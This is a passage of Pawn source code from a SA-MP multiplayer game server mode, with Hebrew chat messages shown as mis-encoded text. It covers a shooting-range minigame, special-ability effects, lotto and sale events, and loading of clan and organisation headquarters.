		if(sportinfo[9] != -1) DestroyObject(sportinfo[9]);
		sportinfo[9] = CreateObject(1598,p[0],p[1],p[2],0.0,0.0,0.0,object_show_distance/*,0,world_sport*/);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],float(rnd*playerinfo[playerid][sportparam]));
		MoveObject(sportinfo[9],p[0],p[1],p[2]+1.5,6.5);
		SportUpdate(6,playerid);
	}
	return 1;
}
//=[ShootingRangeTimer]=========================================================
public ShootingRangeTimer(playerid,status)
{
	#if lagtest
		LagTest_Start("ShootingRangeTimer");
	#endif
	new str[M_S];
	switch(status)
	{
		case 1:
		{
			if(!playerinfo[playerid][srseconds])
			{
				KillTimer(playerinfo[playerid][srtimer]);
				GameTextForPlayer(playerid,"~b~good luck!",1500,4);
				SendClientMessage(playerid,green," ╗ !юшххч фщ°щщф фчь, фхр щё·щщэ сЄху уўф юЄы∙щх, сфЎьчф");
				playerinfo[playerid][srseconds] = 60;
				SetTimerPck(playerinfo[playerid][srtimer],"ShootingRangeTimer",1000,1,"ii",playerid,2);
				SetFreeze(playerid,0);
			}
			else
			{
				format(str,sizeof(str),"~%c~%d",playerinfo[playerid][srseconds] == 2 ? 'b' : 'r',playerinfo[playerid][srseconds]);
				GameTextForPlayer(playerid,str,1000,4);
				playerinfo[playerid][srseconds]--;
			}
		}
		case 2:
		{
			if(!playerinfo[playerid][srseconds])
			{
				KillTimer(playerinfo[playerid][srtimer]);
				playerinfo[playerid][srseconds] = 0;
				StopShootingRange(playerid);
				SetPlayerPos(playerid,301.5105,-78.8933,1001.5156);
				SetPlayerFacingAngle(playerid,88.2607);
				SetFreeze(playerid,0);
				SendClientMessage(playerid,brown," .фюшххч фё·щщэ! Єь фюёъ юхЇщЄ фЁщўху ∙ьъ");
				new dia[300], rnk[32], perc = floatround(floatmul(floatdiv(playerinfo[playerid][srscore],playerinfo[playerid][srtotal]),100));
				switch(perc)
				{
					case 100: rnk = "Ї°Їўш!";
					case 90..99: rnk = "юуфщэ!";
					case 80..89: rnk = "∙щчў· рх·ф!";
					case 70..79: rnk = "ыь фысху!";
					case 60..69: rnk = "Ёчюу!";
					case 30..59: rnk = "ыурщ ∙··рюя!";
					case 1..29: rnk = "сьщ ьфЄьщс, р·ф ущ т°хЄ";
					case 0: rnk = "рЇё!";
				}
				format(dia,sizeof(dia),@c(red) "°ю· ўх∙щ:\n" @c(lightred) "%d\n" @c(red) "юёЇ° рхсщщўшщэ ∙фхЇщЄх: " @c(lightred) "%d\n" @c(red) "юёЇ° рхсщщўшщэ ∙ф°ё·: " @c(lightred) "%d\n" @c(red) "рчхцщэ ∙ф°ё·: " @c(lightred) "%d %%\n" @c(red) "ущ°хт: " @c(lightred) "%s",playerinfo[playerid][srlevel],playerinfo[playerid][srtotal],playerinfo[playerid][srscore],perc,rnk);
				ShowPlayerDialog(playerid,dialog_shootingrange,DIALOG_STYLE_MSGBOX,"Ёщўху юшххч фщ°щх·",dia,"ётх°","∙хс");
				if(playerinfo[playerid][srtotal] == playerinfo[playerid][srscore] && playerinfo[playerid][srlevel] == 3) ObjectiveComplete(playerid,objective_shootrange,false);
			}
			else
			{
				if(playerinfo[playerid][srseconds] > 0 && playerinfo[playerid][srseconds] % 15 == 0)
				{
					format(str,sizeof(str)," - !юшххч фщ°щх· ∙ьъ щё·щщэ сЄху %d ∙Ёщх·",playerinfo[playerid][srseconds]);
					SendClientMessage(playerid,brown,str);
				}
				if(playerinfo[playerid][srobjs] < (2+playerinfo[playerid][srlevel]) && playerinfo[playerid][srseconds] % SR_ObjectPerSecond(playerinfo[playerid][srlevel]) == 0)
				{
					playerinfo[playerid][srtotal]++;
					new Float:p[3], ids[] = {1583,1584,1585,1586}, o, srtype = random(playerinfo[playerid][srlevel] == 1 ? 1 : 3);
					switch(srtype)
					{
						case 0:
						{
							SRL_RandomPoint(p[0],p[1],p[2]);
							new ud = random(2);
							o = CreateSObject(ids[random(sizeof(ids))],p[0],p[1], !ud ? p[2]-4.0 : p[2]+6.0,0.0,0.0,90.0,50.0,4,GetPlayerVirtualWorld(playerid));
							MoveSObject(o,p[0],p[1],p[2],4.5);
							SetTimerEx("SR_MoveObjectByTimer",1500 + (random(3)*500),0,"iffffi",o,p[0],p[1],!ud ? p[2]+6.0 : p[2]-4.0,5.5,1);
						}
						case 1, 2:
						{
							new ln = -1, Float:spd = floatrand(3.0,6.1), Float:eol[3];
							if(srtype == 2) ln = SRL_XLine(-1,p[0],p[1],p[2]);
							else ln = SRL_YLine(-1,p[0],p[1],p[2]);
							o = CreateSObject(ids[random(sizeof(ids))],p[0],p[1],p[2],0.0,0.0,90.0,50.0,4,GetPlayerVirtualWorld(playerid));
							if(srtype == 2) SRL_XLine(ln,eol[0],eol[1],eol[2],0);
							else SRL_YLine(ln,eol[0],eol[1],eol[2],0);
							MoveSObject(o,eol[0],eol[1],eol[2],spd);
							SetTimerEx("SR_MoveObjectByTimer",3000,0,"iffffi",o,p[0],p[1],p[2],spd,1);
						}
					}
					Streamer_Update(playerid);
					AddToSRObjectList(playerid,o);
				}
				playerinfo[playerid][srseconds]--;
			}
		}
	}
	#if lagtest
		LagTest_End("ShootingRangeTimer");
	#endif
	return 1;
}
//=[ShowSGarageMenu]============================================================
public ShowSGarageMenu(playerid)
{
	assert IsPlayerConnected(playerid);
	ShowMenuForPlayer(sgarageMenu,playerid);
	SetFreeze(playerid,1);
	return 1;
}
//=[LaserEye]===================================================================
public LaserEye(playerid,num)
{
	if(!IsPlayerConnected(playerid)) return 1;
	if(num >= 1 && num <= 3)
	{
		PlaySound(playerid,1057);
		SetTimerEx("LaserEye",500,0,"ii",playerid,num+1);
	}
	else
	{
		new Float:p[3], flag = -1;
		for(new i = 0; i < MAX_PLAYERS_ && flag == -1; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && i != playerid && IsPlayerInRangeOfPoint(i,50.0,p[0],p[1],p[2])) flag = i;
		if(flag != -1) GetPlayerPos(flag,p[0],p[1],p[2]);
		else GetPlayerCameraLine(playerid,p[0],p[1],p[2],30.0);
		CreateExplosionVW(p[0],p[1],p[2],7,0.1,world_normal);
		RemovePlayerAttachedObject(playerid,aoslot_godeyeright);
		RemovePlayerAttachedObject(playerid,aoslot_godeyeleft);
	}
	return 1;
}
//=[TempTextDraw]===============================================================
public TempTextDraw(playerid,txtnum,des)
{
	#if lagtest
		LagTest_Start("TempTextDraw");
	#endif
	PlayerTextDrawHide(playerid,playerinfo[playerid][temptext][txtnum]);
	if(des) PlayerTextDrawDestroy(playerid,playerinfo[playerid][temptext][txtnum]);
	playerinfo[playerid][temptext][txtnum] = INVALID_PLAYER_TEXT_DRAW;
	playerinfo[playerid][temptextid][txtnum] = temptext_none;
	playerinfo[playerid][temptextdes][txtnum] = 0;
	playerinfo[playerid][temptexttimer][txtnum] = -1;
	#if lagtest
		LagTest_End("TempTextDraw");
	#endif
	return 1;
}
//=[GoingDown]==================================================================
public GoingDown(playerid,Float:h,Float:a,num)
{
	if(!num) SetPlayerVelocity(playerid,0.0,0.0,-3.0);
	else
	{
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateExplosionVW(p[0],p[1],p[2],6,0.1,world_normal);
		SetPlayerHealth(playerid,h);
		SetPlayerArmour(playerid,a);
	}
	return 1;
}
//=[TempWeather]================================================================
public TempWeather(playerid) return IsPlayerConnected(playerid) ? SetPlayerWeather(playerid,worlddef_weather) : 1;
//=[HealingTree]================================================================
public HealingTree(playerid,num)
{
	if(!IsPlayerConnected(playerid))
	{
		DestroySObject(playerinfo[playerid][waterobj]);
		return 1;
	}
	if(num >= 10) DestroySObject(playerinfo[playerid][waterobj]);
	else
	{
		SetTimerEx("HealingTree",1000,0,"ii",playerid,num+1);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,12.5,playerinfo[playerid][waterpos][0],playerinfo[playerid][waterpos][1],playerinfo[playerid][waterpos][2])) AddHP(i,15.0);
	}
	return 1;
}
//=[WoodClone]==================================================================
public WoodClone(num,playerid)
{
	if(num == 0)
	{
		new Float:o[3], Float:p[3], att = random(3);
		GetSObjectPos(playerinfo[playerid][waterobj],o[0],o[1],o[2]);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,3.0,o[0],o[1],o[2]))
		{
			GetPlayerPos(i,p[0],p[1],p[2]);
			switch(att)
			{
				case 0: CreateExplosionVW(p[0],p[1],p[2],12,0.1,world_normal);
				case 1: SetPlayerForwardVelocity(i,-2.0,2.0);
				case 2: Damage(i,30.0,playerid);
			}
		}
	}
	else if(num == 1) DestroySObject(playerinfo[playerid][waterobj]);
	return 1;
}
//=[EraseCircleEffect]==========================================================
public EraseCircleEffect(playerid,erased,t)
{
	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(erased)) return 1;
	switch(t)
	{
		case 1:
		{
			if(IsPlayerInAnyVehicle(erased)) SetVehicleVelocity(GetPlayerVehicleID(erased),0.0,0.0,floatrand(0.8,3.0));
			else
			{
				SetPlayerVelocity(erased,0.0,0.0,floatrand(0.8,3.0));
				SetPlayerVelocityToPos(erased,playerinfo[playerid][erapos][0],playerinfo[playerid][erapos][1],floatdiv(float(GetPlayerDistanceToPoint(erased,playerinfo[playerid][erapos][0],playerinfo[playerid][erapos][1])),8.0),0.2);
			}
		}
		case 2:
		{
			new Float:z[2];
			if(IsPlayerInAnyVehicle(erased))
			{
				new v = GetPlayerVehicleID(erased);
				GetVehiclePos(v,z[0],z[0],z[1]);
				SetVehiclePos(v,playerinfo[playerid][erapos][0],playerinfo[playerid][erapos][1],z[1]);
			}
			else
			{
				GetPlayerPos(erased,z[0],z[0],z[1]);
				SetPlayerPos(erased,playerinfo[playerid][erapos][0],playerinfo[playerid][erapos][1],z[1]);
			}
		}
		case 3:
		{
			new Float:p[3];
			if(IsPlayerInAnyVehicle(erased))
			{
				new v = GetPlayerVehicleID(erased);
				GetVehiclePos(v,p[0],p[1],p[2]);
				SetVehicleVelocity(GetPlayerVehicleID(erased),0.0,0.0,-2.5);
			}
			else
			{
				SetPlayerVelocity(erased,0.0,0.0,-2.5);
				GetPlayerPos(erased,p[0],p[1],p[2]);
			}
			CreateExplosionVW(p[0],p[1],p[2],12,0.3,world_normal);
		}
	}
	return 1;
}
//=[MoonAttack]=================================================================
public MoonAttack(playerid,todmg)
{
	if(todmg) SetPlayerHealth(playerid,0.0);
	SetPlayerTime(playerid,worlddef_time,0);
	return 1;
}
//=[StartAmmunationSale]========================================================
public StartAmmunationSale()
{
	if(debugstate) printf("Gamemode Activity [start]: StartAmmunationSale");
	#if lagtest
		LagTest_Start("StartAmmunationSale");
	#endif
	ammusale[0] = randomEx(1,3), ammusale[1] = random(2), ammusale[2] = !ammusale[1] ? randomEx(2,9) : randomEx(0,21);
	SendClientMessageToAll(lightgreen," Х Х :юсЎЄ Єы∙щх счЁх· фЁ∙ўщэ ью∙ъ 20 фуўх· фў°хсх· Х Х");
	SendClientMessageToAll(lightgreen,AmmunationSaleName());
	SetTimer("EndAmmunationSale",1200000,0);
	#if lagtest
		LagTest_End("StartAmmunationSale");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartAmmunationSale");
	return 1;
}
//=[EndAmmunationSale]==========================================================
public EndAmmunationSale()
{
	specialActivity = sa_none, ammusale = {ammusale_none,0,0};
	SendClientMessageToAll(lightgreen," Х Х !фюсЎЄ счЁх· фЁ∙ўщэ фё·щщэ Х Х");
	return 1;
}
//=[PutInUnderground]===========================================================
public PutInUnderground(playerid) return playerinfo[playerid][underearth] = 1;
//=[TDAMDisappear]==============================================================
public TDAMDisappear() return TextDrawHideForAll(tdam), 1;
//=[DoubleLotto]======================================================================
public DoubleLotto()
{
	if(debugstate) printf("Gamemode Activity [start]: DoubleLotto");
	#if lagtest
		LagTest_Start("DoubleLotto");
	#endif
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightgreen," $$ !фт°ь· фурсь ьхшх ю·чщьф Єы∙щх, юёЇ° рў°рщ сщя 1 ь 100 фхт°ь $$");
	SendClientMessageToAll(green," /dlotto [1-100] :Ёёх р· юцьыэ");
	SendClientMessageToAll(orange," Х !ф°р∙хя ∙щЁч∙ р· фюёЇ° щщцыф сёыхэ ыёЇщ сщя 20000$ ь 40000$");
	SendClientMessageToAll(orange," Х !сющуф хьр щфщф цхыф ·хъ уўф хчЎщ ффт°ьф ·ё·щщэ");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	dlottonum[0] = randomEx(1,101);
	SetTimer("DoubleLotto2",90000,0);
	#if lagtest
		LagTest_End("DoubleLotto");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: DoubleLotto");
	return 1;
}
//=[DoubleLotto2]===============================================================
public DoubleLotto2()
{
	if(debugstate) printf("Gamemode Activity [start]: DoubleLotto2");
	#if lagtest
		LagTest_Start("DoubleLotto2");
	#endif
	new string[M_S];
	if(dlottonum[1] == -1 || !IsPlayerConnected(dlottonum[1]))
	{
		format(string,sizeof(string)," .рє рчу ьр цыф сьхшх! фюёЇ° фщф %d",dlottonum[0]);
		SendClientMessageToAll(red,string);
	}
	else
	{
		new pay = 20000 + (5000 * random(5));
		SendClientMessage(dlottonum[1],green," !фЁщчх∙ ∙ьъ Ёыхя");
		format(string,sizeof(string)," $$ !цыф сурсь ьхшх хўщсь %d$ %s $$",pay,GetName(dlottonum[1]));
		SendClientMessageToAll(lightgreen,string);
		format(string,sizeof(string)," .фюёЇ° фщф %d",dlottonum[0]);
		SendClientMessageToAll(green,string);
		GiveMoney(dlottonum[1],headserver != dlottonum[1] ? pay : pay*2, 11);
		act_SaveWin(dlottonum[1],act_Code(aid_chat,5));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][plotto] == dlottonum[0] && dlottonum[1] != i) SendClientMessage(i,red," .р·ф рхюЁэ тэ Ёщч∙· р· фюёЇ° фЁыхя, ръ фюЁЎч фўущэ рх·ъ");
	}
	dlottonum[0] = -1, dlottonum[1] = -1;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) playerinfo[i][plotto] = -1;
	specialActivity = sa_none;
	#if lagtest
		LagTest_End("DoubleLotto2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: DoubleLotto2");
	return 1;
}
//=[HeadquarterElevator]========================================================
public HeadquarterElevator(playerid,clanid)
{
	#if lagtest
		LagTest_Start("HeadquarterElevator");
	#endif
	if(clanid == -1)
	{
		objectinfo[hqeObject][patheventparam] = INVALID_PLAYER_ID;
		new Float:op[2];
		GetSObjectPos(hqeObject,op[0],op[0],op[1]);
		AddSObjectPath(hqeObject,154.2227,-1945.5432,op[1],15.0);
		AddSObjectPath(hqeObject,154.2227,-1945.5432,4.7210,15.0);
	}
	else
	{
		assert IsPlayerConnected(playerid);
		if(GetPlayerCheckpoint(playerid) != cp_lighthouse || !IsPlayerInCheckpoint(playerid) || GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с·хъ фЎ'ўЇхщЁш ∙ь фютуьх°");
		if(GetMoney(playerid) < 500) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		SetPlayerAttachedObject(playerid,aoslot_elevator,18844,2,-0.6,0.0,0.0,0.0,0.0,0.0,0.02,0.02,0.02);
		GiveMoney(playerid,0-500);
		new Float:p[3], Float:hqp[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetHQAveragePos(clanid,hqp[0],hqp[1],hqp[2]);
		Streamer_Update(playerid);
		hqeObject = CreateSObject(1649,p[0],p[1],p[2]-4.0,270.24078,0.0,0.0);
		objectinfo[hqeObject][patheventparam] = playerid;
		SetPlayerVelocity(playerid,0.0,0.0,0.3);
		AddSObjectPath(hqeObject,p[0],p[1],p[2]+90.0,15.0);
		AddSObjectPath(hqeObject,hqp[0],hqp[1],p[2]+90.0,15.0);
	}
	format(objectinfo[hqeObject][pathevent],32,"HQElevatorEvent");
	#if lagtest
		LagTest_End("HeadquarterElevator");
	#endif
	return 1;
}
//=[HQElevatorEvent]============================================================
public HQElevatorEvent(num,playerid)
{
	#if lagtest
		LagTest_Start("HQElevatorEvent");
	#endif
	if(num == 1)
	{
		if(playerid == INVALID_PLAYER_ID)
		{
			DestroySObject(hqeObject);
			hqeObject = -1;
		}
		else
		{
			GiveWeapon(playerid,46,0);
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			SetPlayerPos(playerid,p[0],p[1],p[2]+3.0);
			SetPlayerVelocity(playerid,0.0,0.0,0.3);
			SendClientMessage(playerid,green," >> !ЎЁщчф юфЁф");
			RemovePlayerAttachedObject(playerid,aoslot_elevator);
			PlaySound(playerid,1057);
			SetTimerEx("HeadquarterElevator",1500,0,"ii",playerid,-1);
		}
	}
	#if lagtest
		LagTest_End("HQElevatorEvent");
	#endif
	return 1;
}
//=[GetHeadquarterArea]=========================================================
stock GetHeadquarterArea(fileid,&Float:min_x,&Float:min_y,&Float:max_x,&Float:max_y)
{
	new string[M_S], info[4];
	format(string,sizeof(string),folder_hq "%d.ini",fileid);
	info[0] = fgetint(string, "HQCorner1x");
	info[1] = fgetint(string, "HQCorner1y");
	info[2] = fgetint(string, "HQCorner2x");
	info[3] = fgetint(string, "HQCorner2y");
	if(info[0] > info[2])
	{
		min_x = info[2];
		max_x = info[0];
	}
	else
	{
		min_x = info[0];
		max_x = info[2];
	}
	if(info[1] > info[3])
	{
		min_y = info[3];
		max_y = info[1];
	}
	else
	{
		min_y = info[1];
		max_y = info[3];
	}
	return 1;
}
//=[LoadClanHeadquarter]========================================================
public LoadClanHeadquarter(clanid, fileid)
{
	#if lagtest
		LagTest_Start("LoadClanHeadquarter");
	#endif
	new string[M_S], key[32], keyid = 0, tmp[M_S], Float:p[3], Float:dist = 1500.0, vid, c = 0;
	format(string,sizeof(string),folder_hq "%d.ini", fileid);
	format(key,sizeof(key),"Object%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanObject);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanObject,',');
		if(strlen(clanObject[7]) > 0) CreateSObject_HQ(0,clanid,strval(clanObject[0]),floatstr(clanObject[1]),floatstr(clanObject[2]),floatstr(clanObject[3]),floatstr(clanObject[4]),floatstr(clanObject[5]),floatstr(clanObject[6]),1,floatstr(clanObject[7]),floatstr(clanObject[8]),floatstr(clanObject[9]),floatstr(clanObject[9]));
		else CreateSObject_HQ(0,clanid,strval(clanObject[0]),floatstr(clanObject[1]),floatstr(clanObject[2]),floatstr(clanObject[3]),floatstr(clanObject[4]),floatstr(clanObject[5]),floatstr(clanObject[6]),.move_speed=3.5);
		keyid++, c++;
		format(key,sizeof(key),"Object%d",keyid);
	}
	keyid = 0;
	format(key,sizeof(key),"Vehicle%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanVehicle);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanVehicle,',');
		vid = CreateVehicleEx_HQ(strval(clanVehicle[0]),floatstr(clanVehicle[1]),floatstr(clanVehicle[2]),floatstr(clanVehicle[3]),floatstr(clanVehicle[4]),strval(clanVehicle[5]),strval(clanVehicle[6]),respawntime,clanid);
		format(tmp,sizeof(tmp),"{%s}%s",ClanHexColor(clanid),claninfo[clanid][cname]);
		SetVehicleNumberPlate(vid,tmp);
		keyid++, c++;
		format(key,sizeof(key),"Vehicle%d",keyid);
	}
	keyid = 0;
	format(key,sizeof(key),"Pickup%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanPickup);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanPickup,',');
		CreatePickupEx_HQ(strval(clanPickup[0]),floatstr(clanPickup[1]),floatstr(clanPickup[2]),floatstr(clanPickup[3]),clanid);
		keyid++, c++;
		format(key,sizeof(key),"Pickup%d",keyid);
	}
	keyid = 0;
	format(key,sizeof(key),"Camera%dPos",keyid);
	while(fkeyexist(string,key) && keyid < MAX_CLAN_CAMERAS)
	{
		Reset2DString(clanPickup);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanPickup,',');
		for(new j = 0; j < 3; j++) ccameras[clanid][keyid][camPos][j] = floatstr(clanPickup[j]);
		format(key,sizeof(key),"Camera%d",keyid);
		ccameras[clanid][keyid][camLevel] = (!fgetint(string,key)) ? 1 : fgetint(string,key);
		ccameras[clanid][keyid][camObject] = CreateSObject(19300,ccameras[clanid][keyid][camPos][0],ccameras[clanid][keyid][camPos][1],ccameras[clanid][keyid][camPos][2],0.0,0.0,0.0);
		keyid++;
		format(key,sizeof(key),"Camera%dPos",keyid);
	}
	keyid = 0;
	claninfo[clanid][hashq] = (claninfo[clanid][cobjects] + claninfo[clanid][cvehicles] + claninfo[clanid][cpickups]) > 0;
	if(claninfo[clanid][hashq])
	{
    	new Float:min_x, Float:min_y, Float:max_x, Float:max_y;
    	GetHeadquarterArea(fileid,min_x,min_y,max_x,max_y);
		GetHQAveragePos(clanid,p[0],p[1],p[2]);
		claninfo[clanid][carea] = CreateArea(min_x, min_y, max_x, max_y,area_hq,clanid);
		claninfo[clanid][cclosetele] = -1;
		for(new t = 0; t < sizeof(Teleports); t++) if(!Teleports[t][Ti] && Teleports[t][Tw] == world_normal && Teleports[t][Ttype] == tele_normal && DistanceToPoint(p[0],p[1],p[2],Teleports[t][Tx],Teleports[t][Ty],Teleports[t][Tz]) < dist) claninfo[clanid][cclosetele] = t, dist = DistanceToPoint(p[0],p[1],p[2],Teleports[t][Tx],Teleports[t][Ty],Teleports[t][Tz]);
		//claninfo[clanid][ccp] = fkeyexist(string,"CPX") && fkeyexist(string,"CPY") && fkeyexist(string,"CPZ") ? CreateCheckpoint(fgetfloat(string,"CPX"),fgetfloat(string,"CPY"),fgetfloat(string,"CPZ"),0,world_normal,cp_cbank,default_cpsize,default_cpdistance,0.0,clanid) : -1;
		//new Float:sz = float(claninfo[clanid][cgzonesize] * 40);
		claninfo[clanid][cgzone] = GangZoneCreate(min_x, min_y, max_x, max_y);
		if(claninfo[clanid][cgzoneshow]) GangZoneShowForAll(claninfo[clanid][cgzone],rgba2hex(claninfo[clanid][ccolor][0],claninfo[clanid][ccolor][1],claninfo[clanid][ccolor][2],150));
	}
	viewhqinfo[fileid][hqvalid] = 1;
	viewhqinfo[fileid][hqsize] = fgetint(string, "HQSize");
	viewhqinfo[fileid][hqowner] = clanid;
	UpdateHQList();
	#if lagtest
		LagTest_End("LoadClanHeadquarter");
	#endif
	return c;
}
//=[UnloadClanHeadquarter]======================================================
public UnloadClanHeadquarter(clanid)
{
	#if lagtest
		LagTest_Start("UnloadClanHeadquarter");
	#endif
	for(new i = 0; i < claninfo[clanid][cobjects]; i++) if(IsValidSObject(claninfo[clanid][cobject][i]))
	{
		DestroySObject(claninfo[clanid][cobject][i]);
		objectinfo[claninfo[clanid][cobject][i]][omoving] = {0,0,0};
		objectinfo[claninfo[clanid][cobject][i]][omoveto][0] = 0.0;
		objectinfo[claninfo[clanid][cobject][i]][omoveto][1] = 0.0;
		objectinfo[claninfo[clanid][cobject][i]][omoveto][2] = 0.0;
		objectinfo[claninfo[clanid][cobject][i]][omoveto][3] = 3.5;
		claninfo[clanid][cobject][i] = 0;
	}
	claninfo[clanid][cobjects] = 0;
	for(new i = 0; i < claninfo[clanid][cvehicles]; i++) if(IsValidVehicle(claninfo[clanid][cvehicle][i]))
	{
		DestroyVehicleEx(claninfo[clanid][cvehicle][i]);
		vehicleinfo[claninfo[clanid][cvehicle][i]][vclan] = 0;
		claninfo[clanid][cvehicle][i] = 0;
	}
	claninfo[clanid][cvehicles] = 0;
	for(new i = 0; i < claninfo[clanid][cpickups]; i++) if(pickupinfo[claninfo[clanid][cpickup][i]][pvalid])
	{
		DestroyPickupEx(claninfo[clanid][cpickup][i]);
		pickupinfo[claninfo[clanid][cpickup][i]][pfunc] = 0;
		pickupinfo[claninfo[clanid][cpickup][i]][pspecialid] = 0;
		claninfo[clanid][cpickup][i] = 0;
	}
	claninfo[clanid][cpickups] = 0;
	DestroyArea(claninfo[clanid][carea]);
	/*if(claninfo[clanid][ccp] != -1)
	{
		cpinfo[claninfo[clanid][ccp]][cpactive] = 0;
		claninfo[clanid][ccp] = -1;
	}*/
	GangZoneHideForAll(claninfo[clanid][cgzone]);
	GangZoneDestroy(claninfo[clanid][cgzone]);
	claninfo[clanid][cgzone] = INVALID_GANG_ZONE;
	claninfo[clanid][cclosetele] = -1;
	claninfo[clanid][hashq] = 0;
	UpdateHQList();
	#if lagtest
		LagTest_End("UnloadClanHeadquarter");
	#endif
	return 1;
}
//=[LoadOrgHeadquarter]=========================================================
public LoadOrgHeadquarter(orgid)
{
	#if lagtest
		LagTest_Start("LoadOrgHeadquarter");
	#endif
	new string[M_S], key[32], keyid = 0, tmp[M_S], vid, c = 0;
	format(string,sizeof(string),folder_orgs "%s.ini",orginfo[orgid][oname]);
	format(key,sizeof(key),"Object%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanObject);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanObject,',');
		if(strlen(clanObject[7]) > 0) CreateSObject_HQ(1,orgid,strval(clanObject[0]),floatstr(clanObject[1]),floatstr(clanObject[2]),floatstr(clanObject[3]),floatstr(clanObject[4]),floatstr(clanObject[5]),floatstr(clanObject[6]),1,floatstr(clanObject[7]),floatstr(clanObject[8]),floatstr(clanObject[9]),3.5);
		else CreateSObject_HQ(1,orgid,strval(clanObject[0]),floatstr(clanObject[1]),floatstr(clanObject[2]),floatstr(clanObject[3]),floatstr(clanObject[4]),floatstr(clanObject[5]),floatstr(clanObject[6]),.move_speed = 3.5);
		keyid++, c++;
		format(key,sizeof(key),"Object%d",keyid);
	}
	keyid = 0;
	format(key,sizeof(key),"Vehicle%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanVehicle);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanVehicle,',');
		vid = CreateVehicleEx_HQ(strval(clanVehicle[0]),floatstr(clanVehicle[1]),floatstr(clanVehicle[2]),floatstr(clanVehicle[3]),floatstr(clanVehicle[4]),strval(clanVehicle[5]),strval(clanVehicle[6]),respawntime,orgid,1);
		SetVehicleNumberPlate(vid,orginfo[orgid][oname]);
		keyid++, c++;
		format(key,sizeof(key),"Vehicle%d",keyid);
	}
	keyid = 0;
	format(key,sizeof(key),"Pickup%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanPickup);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanPickup,',');
		CreatePickupEx_HQ(strval(clanPickup[0]),floatstr(clanPickup[1]),floatstr(clanPickup[2]),floatstr(clanPickup[3]),orgid,1);
		keyid++, c++;
		format(key,sizeof(key),"Pickup%d",keyid);
	}
	keyid = 0;
	orginfo[orgid][ohashq] = (orginfo[orgid][oobjects] + orginfo[orgid][ovehicles] + orginfo[orgid][opickups]) > 0;
	#if lagtest
		LagTest_End("LoadOrgHeadquarter");
	#endif
	return c;
}
//=[UnloadOrgHeadquarter]=======================================================
public UnloadOrgHeadquarter(orgid)
{
	#if lagtest
		LagTest_Start("UnloadOrgHeadquarter");
	#endif
	for(new i = 0; i < orginfo[orgid][oobjects]; i++) if(IsValidSObject(orginfo[orgid][oobject][i]))
	{
		DestroySObject(orginfo[orgid][oobject][i]);
		objectinfo[orginfo[orgid][oobject][i]][omoving] = {0,0,0};
		objectinfo[orginfo[orgid][oobject][i]][omoveto][0] = 0.0;
		objectinfo[orginfo[orgid][oobject][i]][omoveto][1] = 0.0;
		objectinfo[orginfo[orgid][oobject][i]][omoveto][2] = 0.0;
		orginfo[orgid][oobject][i] = 0;
	}
	orginfo[orgid][oobjects] = 0;
	for(new i = 0; i < orginfo[orgid][ovehicles]; i++) if(IsValidVehicle(orginfo[orgid][ovehicle][i]))
	{
		DestroyVehicleEx(orginfo[orgid][ovehicle][i]);
		vehicleinfo[orginfo[orgid][ovehicle][i]][vorg] = 0;
		orginfo[orgid][ovehicle][i] = 0;
	}
	orginfo[orgid][ovehicles] = 0;
	for(new i = 0; i < orginfo[orgid][opickups]; i++) if(pickupinfo[orginfo[orgid][opickup][i]][pvalid])
	{
		DestroyPickupEx(orginfo[orgid][opickup][i]);
		pickupinfo[orginfo[orgid][opickup][i]][pfunc] = 0;
		pickupinfo[orginfo[orgid][opickup][i]][pspecialid] = 0;
		orginfo[orgid][opickup][i] = 0;
	}
	orginfo[orgid][opickups] = 0;
	orginfo[orgid][ohashq] = 0;
	#if lagtest
		LagTest_End("UnloadOrgHeadquarter");
	#endif
	return 1;
}
//=[StartArmy]==================================================================
public StartArmy(ty)
{
	#if lagtest
		LagTest_Start("StartArmy");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: StartArmy");
	new string[M_S];
	if(thereIsAct) return 0;
	armyinfo[0] = 1, armyinfo[1] = 0, armyinfo[2] = 60, armyinfo[3] = SetTimer("StartArmy2",1000,1), armyinfo[4] = ty;
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху уўф Army Game фЇЄщьх·");
	SendClientMessageToAll(green," /join рх /army join ьфЎш°Їх· °∙юх р· фЇўхуф");
